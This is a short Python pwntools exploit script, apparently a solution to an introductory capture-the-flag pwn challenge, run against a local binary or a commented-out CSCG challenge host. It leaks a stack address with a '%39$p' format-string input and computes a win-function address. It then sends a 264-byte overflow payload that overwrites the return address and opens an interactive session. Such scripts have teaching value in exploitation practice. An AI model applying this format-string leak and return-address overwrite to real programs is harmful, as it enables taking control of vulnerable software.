from pwn import *

io = process('./pwn1')
#io = remote('7b0000006528e7fc4eafc780-intro-pwn-1.challenge.broker.cscg.live', 31337, ssl = True)
print(io.recv())
io.sendline('%39$p')
print(io.recvuntil(b'\x94\x98\n'))
win = int(io.recvline().split()[0], 16)-309
print('WIN address', hex(win))
io.sendline(b'Expelliarmus\0'+b'A'*(264-len(b'Expelliarmus\0'))+p64(win+0x36)+p64(win))
print(io.recv())
io.interactive()
